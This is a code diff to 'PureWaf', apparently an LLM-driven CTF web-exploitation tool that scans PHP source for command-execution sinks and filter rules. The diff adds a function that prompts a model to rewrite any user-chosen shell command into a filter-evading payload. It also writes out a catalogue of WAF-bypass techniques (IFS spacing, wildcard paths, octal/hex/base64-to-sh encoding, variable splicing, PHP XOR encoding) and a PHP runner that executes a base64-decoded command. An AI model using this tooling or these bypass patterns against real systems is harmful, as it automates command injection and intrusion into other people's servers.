@@ -204,12 +204,22 @@ class LlmSinkCandidate:
 
 
 @dataclass
+class LlmWafExtraction:
+    waf_words: List[str] = field(default_factory=list)
+    waf_chars: List[str] = field(default_factory=list)
+    waf_regex: List[str] = field(default_factory=list)
+    limit_length: Optional[int] = None
+    confidence: float = 0.0
+
+
+@dataclass
 class LlmSinkAnalysis:
     enabled: bool = False
     used: bool = False
     model: str = ""
     endpoint: str = ""
     candidates: List[LlmSinkCandidate] = field(default_factory=list)
+    waf_extraction: Optional[LlmWafExtraction] = None
     error: str = ""
 
 
@@ -298,7 +308,7 @@ class PureWafLlmSinkAgent:
         content, endpoint, chat_error = self._chat_completion(
             settings,
             self.build_messages(source),
-            max_tokens=900,
+            max_tokens=1200,
         )
         if chat_error:
             if self.session:
@@ -312,7 +322,9 @@ class PureWafLlmSinkAgent:
             )
 
         try:
-            candidates = self._parse_candidates(content)
+            parsed = self._load_json_content(content)
+            candidates = self._parse_candidates_from_parsed(parsed)
+            waf_extraction = self._parse_waf_extraction(parsed)
         except Exception as exc:
             if self.session:
                 self.session.record_tool_result("llm_sink_analysis", {"error": str(exc)})
@@ -331,6 +343,7 @@ class PureWafLlmSinkAgent:
                     "model": settings.model,
                     "candidate_count": len(candidates),
                     "candidates": [candidate.as_dict() for candidate in candidates[:3]],
+                    "waf_extraction": waf_extraction is not None,
                 },
             )
         return LlmSinkAnalysis(
@@ -339,6 +352,7 @@ class PureWafLlmSinkAgent:
             model=settings.model,
             endpoint=endpoint,
             candidates=candidates,
+            waf_extraction=waf_extraction,
         )
 
     def _chat_completion(
@@ -346,6 +360,7 @@ class PureWafLlmSinkAgent:
         settings: "_LlmSettings",
         messages: List[Dict[str, str]],
         max_tokens: int,
+        max_retries: int = 2,
     ) -> Tuple[str, str, str]:
         endpoint = self._normalize_chat_completions_url(settings.base_url)
         if self.session:
@@ -365,30 +380,43 @@ class PureWafLlmSinkAgent:
             "temperature": 0,
             "max_tokens": max_tokens,
         }
-        req = request.Request(
-            endpoint,
-            data=json.dumps(body).encode("utf-8"),
-            headers={
-                "Authorization": f"Bearer {settings.api_key}",
-                "Content-Type": "application/json",
-            },
-            method="POST",
-        )
+        req_data = json.dumps(body).encode("utf-8")
 
-        try:
-            with request.urlopen(req, timeout=self.timeout) as response:
-                raw = response.read().decode("utf-8", "replace")
-        except error.HTTPError as exc:
-            return "", endpoint, self._format_http_error(exc, endpoint, settings)
-        except Exception as exc:
-            return "", endpoint, f"LLM request failed: {exc}"
+        last_error = ""
+        for attempt in range(max_retries + 1):
+            req = request.Request(
+                endpoint,
+                data=req_data,
+                headers={
+                    "Authorization": f"Bearer {settings.api_key}",
+                    "Content-Type": "application/json",
+                },
+                method="POST",
+            )
+            try:
+                with request.urlopen(req, timeout=self.timeout) as response:
+                    raw = response.read().decode("utf-8", "replace")
+                try:
+                    payload = json.loads(raw)
+                    content = payload["choices"][0]["message"]["content"]
+                except Exception as exc:
+                    return "", endpoint, f"LLM response invalid: {exc}"
+                return str(content), endpoint, ""
+            except error.HTTPError as exc:
+                last_error = self._format_http_error(exc, endpoint, settings)
+                status_code = getattr(exc, "code", 0)
+                if status_code in (429, 500, 502, 503, 504) and attempt < max_retries:
+                    time.sleep(1.5 * (attempt + 1))
+                    continue
+                return "", endpoint, last_error
+            except Exception as exc:
+                last_error = f"LLM request failed: {exc}"
+                if attempt < max_retries:
+                    time.sleep(1.0 * (attempt + 1))
+                    continue
+                return "", endpoint, last_error
 
-        try:
-            payload = json.loads(raw)
-            content = payload["choices"][0]["message"]["content"]
-        except Exception as exc:
-            return "", endpoint, f"LLM response invalid: {exc}"
-        return str(content), endpoint, ""
+        return "", endpoint, last_error
 
     @staticmethod
     def _format_http_error(exc: error.HTTPError, endpoint: str, settings: "_LlmSettings") -> str:
@@ -441,10 +469,22 @@ class PureWafLlmSinkAgent:
                     "file_read_path, file_write_upload. Allowed payload_context values are only: "
                     "shell_command, php_code, any. Do not generate payloads. Do not provide exploit "
                     "steps. Do not use external project knowledge or web content. If the source is "
-                    "insufficient, return an empty sinks array. Return only JSON in this shape: "
+                    "insufficient, return an empty sinks array.\n\n"
+                    "In addition to sinks, you MUST also extract WAF/filter constraints from the "
+                    "source code. Identify blocked words (strings checked via strpos, stripos, "
+                    "str_contains, in_array, etc.), blocked characters, regex patterns used for "
+                    "filtering (preg_match), and length limits (strlen). Return these in the waf "
+                    "field. If no WAF constraints are found, return waf as null.\n\n"
+                    "Return only JSON in this shape: "
                     "{\"sinks\":[{\"function\":\"name\",\"kind\":\"command_exec\","
                     "\"payload_context\":\"shell_command\",\"argument_index\":0,"
-                    "\"confidence\":0.0,\"evidence\":\"short source-based reason\"}]}.\n\n"
+                    "\"confidence\":0.0,\"evidence\":\"short source-based reason\"}],"
+                    "\"waf\":{\"blocked_words\":[\"system\",\"exec\"],"
+                    "\"blocked_chars\":[\" \",\";\"],"
+                    "\"regex_patterns\":[\"/system|exec/i\"],"
+                    "\"length_limit\":null,"
+                    "\"confidence\":0.85,"
+                    "\"evidence\":\"short source-based reason\"}}.\n\n"
                     "PureWaf tool usage guide from skills/SKILL.md:\n"
                     f"{skill_guide}"
                 ),
@@ -452,8 +492,8 @@ class PureWafLlmSinkAgent:
             {
                 "role": "user",
                 "content": (
-                    "Analyze this PHP source for PureWaf AUTO sink detection. "
-                    "Return only sink metadata JSON.\n\n"
+                    "Analyze this PHP source for PureWaf AUTO sink detection and WAF extraction. "
+                    "Return only sink metadata and WAF constraints JSON.\n\n"
                     f"{source or ''}"
                 ),
             },
@@ -539,6 +579,9 @@ class PureWafLlmSinkAgent:
 
     def _parse_candidates(self, content: str) -> List[LlmSinkCandidate]:
         parsed = self._load_json_content(content)
+        return self._parse_candidates_from_parsed(parsed)
+
+    def _parse_candidates_from_parsed(self, parsed: Dict) -> List[LlmSinkCandidate]:
         raw_sinks = parsed.get("sinks", [])
         if not isinstance(raw_sinks, list):
             return []
@@ -549,6 +592,48 @@ class PureWafLlmSinkAgent:
             if candidate is not None:
                 candidates.append(candidate)
         return candidates
+
+    @staticmethod
+    def _parse_waf_extraction(parsed: Dict) -> Optional[LlmWafExtraction]:
+        raw = parsed.get("waf")
+        if not isinstance(raw, dict):
+            return None
+        words = [
+            str(w).strip()
+            for w in (raw.get("blocked_words") or [])
+            if isinstance(w, str) and str(w).strip()
+        ]
+        chars = [
+            str(c)
+            for c in (raw.get("blocked_chars") or [])
+            if isinstance(c, str) and len(c) == 1
+        ]
+        regexes = [
+            str(r).strip()
+            for r in (raw.get("regex_patterns") or [])
+            if isinstance(r, str) and str(r).strip()
+        ]
+        limit = raw.get("length_limit")
+        if limit is not None:
+            try:
+                limit = int(limit)
+                if limit <= 0:
+                    limit = None
+            except (TypeError, ValueError):
+                limit = None
+        try:
+            confidence = max(0.0, min(1.0, float(raw.get("confidence", 0.0))))
+        except (TypeError, ValueError):
+            confidence = 0.0
+        if not words and not chars and not regexes and limit is None:
+            return None
+        return LlmWafExtraction(
+            waf_words=words[:50],
+            waf_chars=chars[:30],
+            waf_regex=regexes[:5],
+            limit_length=limit,
+            confidence=confidence,
+        )
 
     @staticmethod
     def _load_json_content(content: str) -> Dict[str, object]:
@@ -725,7 +810,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
         content, _endpoint, chat_error = self._chat_completion(
             settings,
             self.build_project_selection_messages(files),
-            max_tokens=900,
+            max_tokens=1400,
         )
         if chat_error:
             if self.session:
@@ -734,7 +819,9 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
 
         valid_paths = {file.path for file in files}
         try:
-            selected = self._parse_selected_paths(content, valid_paths)
+            parsed = PureWafLlmSinkAgent._load_json_content(content)
+            selected = self._parse_selected_paths_from_parsed(parsed, valid_paths)
+            self._last_combined_parsed = parsed
         except Exception as exc:
             if self.session:
                 self.session.record_tool_result("llm_project_selection", {"error": str(exc)})
@@ -745,6 +832,29 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 {"selected_files": selected[:12], "available_files": len(files)},
             )
         return selected, ""
+
+    def get_combined_sink_analysis(self) -> Optional["LlmSinkAnalysis"]:
+        """Return sink analysis from the combined file-selection+sink call, if available."""
+        parsed = getattr(self, "_last_combined_parsed", None)
+        if not parsed or not isinstance(parsed, dict):
+            return None
+        sinks_raw = parsed.get("sinks")
+        if not isinstance(sinks_raw, list) or not sinks_raw:
+            return None
+        candidates = self._parse_candidates_from_parsed(parsed)
+        waf_extraction = self._parse_waf_extraction(parsed)
+        if not candidates:
+            return None
+        settings, _ = self._load_settings()
+        model = settings.model if settings else ""
+        return LlmSinkAnalysis(
+            enabled=True,
+            used=True,
+            model=model,
+            endpoint="",
+            candidates=candidates,
+            waf_extraction=waf_extraction,
+        )
 
     def build_project_selection_messages(
         self,
@@ -762,15 +872,27 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 "role": "system",
                 "content": (
                     self._immutable_context(
-                        "Stage 1 project file selection for sink identification."
+                        "Stage 1 combined: project file selection + sink/WAF identification."
                     )
                     + "\n\n"
-                    "You are a CTF Web expert selecting PHP files for PureWaf agent AUTO analysis. "
+                    "You are a CTF Web expert analyzing a PHP project for PureWaf agent AUTO mode. "
                     "The primary objective is to understand the path to getting FLAG. "
-                    "Choose only project files that are relevant to user input, filtering, "
-                    "routing, and dangerous sink reachability. Return only JSON shaped as "
-                    "{\"selected_files\":[\"relative/path.php\"],\"reason\":\"short reason\"}. "
-                    "Do not generate payloads in this step."
+                    "Perform TWO tasks in one response:\n"
+                    "1. Select project files relevant to user input, filtering, routing, and "
+                    "dangerous sink reachability.\n"
+                    "2. From the excerpts, identify sinks and WAF constraints if visible.\n\n"
+                    "Allowed sink kinds: command_exec, file_read_path, file_write_upload. "
+                    "Allowed payload_context values: shell_command, php_code, any.\n\n"
+                    "Return only JSON shaped as:\n"
+                    "{\"selected_files\":[\"relative/path.php\"],\"reason\":\"short reason\","
+                    "\"sinks\":[{\"function\":\"name\",\"kind\":\"command_exec\","
+                    "\"payload_context\":\"shell_command\",\"argument_index\":0,"
+                    "\"confidence\":0.0,\"evidence\":\"short reason\"}],"
+                    "\"waf\":{\"blocked_words\":[],\"blocked_chars\":[],"
+                    "\"regex_patterns\":[],\"length_limit\":null,"
+                    "\"confidence\":0.0,\"evidence\":\"short reason\"}}\n\n"
+                    "If sinks or WAF are not identifiable from excerpts alone, return empty "
+                    "sinks array and waf as null. Do not generate payloads."
                 ),
             },
             {
@@ -783,6 +905,10 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
     @staticmethod
     def _parse_selected_paths(content: str, valid_paths: Set[str]) -> List[str]:
         parsed = PureWafLlmSinkAgent._load_json_content(content)
+        return PureWafProjectAgent._parse_selected_paths_from_parsed(parsed, valid_paths)
+
+    @staticmethod
+    def _parse_selected_paths_from_parsed(parsed: Dict, valid_paths: Set[str]) -> List[str]:
         raw_paths = parsed.get("selected_files", [])
         if not isinstance(raw_paths, list):
             return []
@@ -820,6 +946,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
         root_payloads: Optional[Sequence[str]] = None,
         flag_payloads: Optional[Sequence[str]] = None,
         validation_results: Optional[Sequence[PayloadValidationResult]] = None,
+        waf_extraction: Optional[LlmWafExtraction] = None,
     ) -> LlmPayloadReview:
         settings, error = self._load_settings()
         if error:
@@ -837,6 +964,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 root_payloads=root_payloads or [],
                 flag_payloads=flag_payloads or [],
                 validation_results=validation_results or [],
+                waf_extraction=waf_extraction,
             ),
             max_tokens=1000,
         )
@@ -884,6 +1012,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
         root_payloads: Sequence[str],
         flag_payloads: Sequence[str],
         validation_results: Sequence[PayloadValidationResult] = (),
+        waf_extraction: Optional[LlmWafExtraction] = None,
     ) -> List[Dict[str, str]]:
         final_payload = shortest_flag if shortest_flag and shortest_flag != "N/A" else ""
         payload_summary = {
@@ -895,6 +1024,20 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
             "analysis_lines": list(analysis_lines[-20:]),
             "validation_results": [item.as_dict() for item in list(validation_results)[:8]],
         }
+        if waf_extraction is not None:
+            payload_summary["llm_waf_extraction"] = {
+                "blocked_words": waf_extraction.waf_words,
+                "blocked_chars": waf_extraction.waf_chars,
+                "regex_patterns": waf_extraction.waf_regex,
+                "length_limit": waf_extraction.limit_length,
+            }
+        waf_constraint_instruction = ""
+        if waf_extraction is not None:
+            waf_constraint_instruction = (
+                " The fallback_payload MUST NOT contain any blocked words, characters, "
+                "or match regex patterns listed in the llm_waf_extraction field of the "
+                "PureWaf output summary."
+            )
         return [
             {
                 "role": "system",
@@ -911,7 +1054,9 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                     "a usable /flag payload, set valid=true and leave fallback_payload empty. If "
                     "PureWaf produced no usable /flag payload, or the provided payload does not fit "
                     "the detected sink/filter context, set valid=false and provide exactly one "
-                    "fallback_payload that attempts to read /flag through the detected sink. Do not "
+                    "fallback_payload that attempts to read /flag through the detected sink."
+                    f"{waf_constraint_instruction}"
+                    " Do not "
                     "give exploitation steps or prose outside JSON. Return only JSON shaped as "
                     "{\"valid\":true,\"fallback_payload\":\"\",\"notes\":\"short source-based note\"}."
                 ),
@@ -1087,7 +1232,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
             return "file_read_path"
         if payload_context == "php_code":
             return "php_code"
-        if payload_context == "shell_command" and os.name != "nt":
+        if payload_context == "shell_command":
             return "shell_command"
         if payload_context == "any":
             if lowered.startswith(("php://", "file://", "data://")) or "/flag" in lowered:
@@ -1102,9 +1247,9 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
         rewritten = str(payload or "")
         configured_flag = flagfile or ""
         if configured_flag and configured_flag in rewritten:
-            return rewritten.replace(configured_flag, flag_path)
+            return rewritten.replace(configured_flag, flag_path, 1)
         if "/flag" in rewritten:
-            rewritten = rewritten.replace("/flag", flag_path)
+            rewritten = rewritten.replace("/flag", flag_path, 1)
         return rewritten
 
     @staticmethod
@@ -1122,9 +1267,10 @@ if ($out !== false) {
             runner = """
 $cmd = base64_decode($payload_b64);
 ob_start();
-system($cmd);
-$out = ob_get_clean();
-echo $out;
+$out = shell_exec($cmd);
+if ($out !== null) { echo $out; }
+$ob = ob_get_clean();
+if ($ob) { echo $ob; }
 """
         else:
             runner = """
@@ -1152,4 +1298,107 @@ echo $out;
             valid=bool(parsed.get("valid", False)),
             fallback_payload=str(parsed.get("fallback_payload", "") or "").strip()[:1000],
             notes=str(parsed.get("notes", "") or "").strip()[:500],
+        )
+
+    def generate_custom_command_bypass(
+        self,
+        source: str,
+        command: str,
+        event_callback=None,
+    ) -> Dict[str, str]:
+        if event_callback:
+            event_callback("[*] Custom command bypass: loading LLM settings")
+        settings, error = self._load_settings()
+        if error:
+            return {"payload": "", "notes": "", "error": error}
+
+        if event_callback:
+            event_callback("[*] Custom command bypass: analyzing WAF constraints and generating payload")
+        content, endpoint, chat_error = self._chat_completion(
+            settings,
+            self.build_custom_command_messages(source, command),
+            max_tokens=1000,
+        )
+        if chat_error:
+            return {"payload": "", "notes": "", "error": chat_error}
+
+        if event_callback:
+            event_callback(f"[*] Custom command bypass: LLM responded (model={settings.model})")
+        try:
+            parsed = self._load_json_content(content)
+            return {
+                "payload": str(parsed.get("payload", "") or "").strip()[:1000],
+                "notes": str(parsed.get("notes", "") or "").strip()[:500],
+                "error": "",
+            }
+        except Exception as exc:
+            return {"payload": "", "notes": "", "error": f"LLM response invalid: {exc}"}
+
+    def build_custom_command_messages(
+        self,
+        source: str,
+        command: str,
+    ) -> List[Dict[str, str]]:
+        tamper_desc = self._describe_tamper_techniques()
+        bypass_desc = self._describe_bypass_templates()
+        return [
+            {
+                "role": "system",
+                "content": (
+                    self._immutable_context(
+                        "Custom command bypass generation for a detected command_exec sink."
+                    )
+                    + "\n\n"
+                    "You are a CTF Web expert generating WAF-bypass payloads for PureWaf. "
+                    "The user wants to execute a specific shell command through a detected "
+                    "command_exec sink that has WAF filtering. Your job:\n"
+                    "1. Analyze the PHP source to understand the WAF constraints (blocked words, "
+                    "chars, regex patterns, length limits, sanitizers).\n"
+                    "2. Determine if the user's command can pass the WAF as-is.\n"
+                    "3. If blocked, transform the command using these bypass techniques:\n"
+                    f"{tamper_desc}\n\n"
+                    f"{bypass_desc}\n\n"
+                    "4. Return a single payload that executes the equivalent of the user's command "
+                    "while bypassing all detected WAF rules. The payload must fit the sink's "
+                    "execution context (shell_command or php_code).\n\n"
+                    "Return only JSON: {\"payload\":\"the_bypass_payload\","
+                    "\"notes\":\"short explanation of what was bypassed and how\"}.\n"
+                    "Do not include exploitation steps or prose outside JSON."
+                ),
+            },
+            {
+                "role": "user",
+                "content": (
+                    f"PHP source:\n{source[:MAX_PROJECT_SOURCE_BYTES]}\n\n"
+                    f"User command to execute: {command}\n\n"
+                    "Generate a WAF-bypass payload for this command."
+                ),
+            },
+        ]
+
+    @staticmethod
+    def _describe_tamper_techniques() -> str:
+        from . import tamper
+        lines = ["Available tamper/bypass techniques:"]
+        for plugin in tamper.get_plugins():
+            lines.append(f"- {plugin.name}: {plugin.description}")
+        return "\n".join(lines)
+
+    @staticmethod
+    def _describe_bypass_templates() -> str:
+        return (
+            "Available bypass patterns:\n"
+            "- Space bypass: ${IFS}, $IFS$9, \\t, +, %09, <>, {cmd,arg}\n"
+            "- Slash bypass: ${PWD:0:1}, ${HOME:0:1}\n"
+            "- Word bypass: single quotes (ca''t), double quotes (ca\"\"t), "
+            "backslashes (c\\a\\t), uninitialized vars (ca${x}t)\n"
+            "- Encoding: octal ($'\\143\\141\\164'), base64 pipe "
+            "(echo Y2F0IC9mbGFn|base64 -d|sh), hex ($'\\x63\\x61\\x74')\n"
+            "- Wildcard: /f?ag, /fl*, cat /???g, /bin/ca? /fla?\n"
+            "- Variable construction: a=ca;b=t;$a$b /flag\n"
+            "- PHP wrappers: backticks (`cmd`), system(), passthru(), "
+            "shell_exec(), exec()\n"
+            "- PHP encoding: chr() construction, XOR encoding, NOT encoding\n"
+            "- Newline bypass: %0a as command separator\n"
+            "- Semicolon alternatives: || , && , %0a, \\n"
         )
